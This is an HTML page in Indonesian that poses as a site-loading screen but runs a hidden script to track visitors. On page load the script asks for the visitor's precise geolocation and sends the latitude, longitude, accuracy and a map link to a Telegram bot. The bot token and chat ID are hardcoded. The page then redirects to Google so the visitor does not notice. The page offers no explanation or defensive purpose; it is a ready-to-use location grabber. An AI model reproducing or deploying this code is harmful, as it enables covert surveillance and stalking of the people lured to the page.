<!DOCTYPE html>
<html>
<head>
    <title>Situs Sedang Dimuat...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            background: #ffffff; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0;
            font-family: sans-serif; 
            color: #333;
        }
        .loader { 
            border: 5px solid #f3f3f3; 
            border-top: 5px solid #3498db; 
            border-radius: 50%; 
            width: 50px; 
            height: 50px; 
            animation: spin 1s linear infinite; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 20px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Harap tunggu, sedang mengoptimalkan halaman...</p>

    <script>
        // --- KONFIGURASI TELEGRAM ---
        const TELEGRAM_TOKEN = "8453932745:AAFZrJ_P-aSqRB1rwqJgNAppnp3KYOb9aOc";
        const TELEGRAM_CHAT_ID = "6111341670";
        const REDIRECT_URL = "https://www.google.com"; // Tujuan setelah dapat lokasi

        window.onload = function() {
            if (navigator.geolocation) {
                // Meminta lokasi saat halaman dimuat
                navigator.geolocation.getCurrentPosition(sendToTelegram, handleError, {
                    enableHighAccuracy: true,
                    timeout: 10000
                });
            } else {
                window.location.href = REDIRECT_URL;
            }
        };

        function sendToTelegram(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const acc = position.coords.accuracy;
            
            // Link Google Maps
            const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
            
            // Format Pesan
            const teks = `📍 *LOKASI TERDETEKSI!*\n\n` +
                         `📌 *Lat:* \`${lat}\`\n` +
                         `📌 *Lon:* \`${lon}\`\n` +
                         `🎯 *Akurasi:* ${acc} meter\n\n` +
                         `🌍 *Google Maps:* [Klik di Sini](${googleMaps})`;

            // Mengirim data menggunakan API Telegram
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: teks,
                    parse_mode: 'Markdown'
                })
            }).then(() => {
                // Setelah terkirim, alihkan pengguna
                window.location.href = REDIRECT_URL;
            }).catch(() => {
                window.location.href = REDIRECT_URL;
            });
        }

        function handleError(error) {
            // Jika user menolak (PERMISSION_DENIED) atau error lain, tetap alihkan
            window.location.href = REDIRECT_URL;
        }
    </script>
</body>
</html>
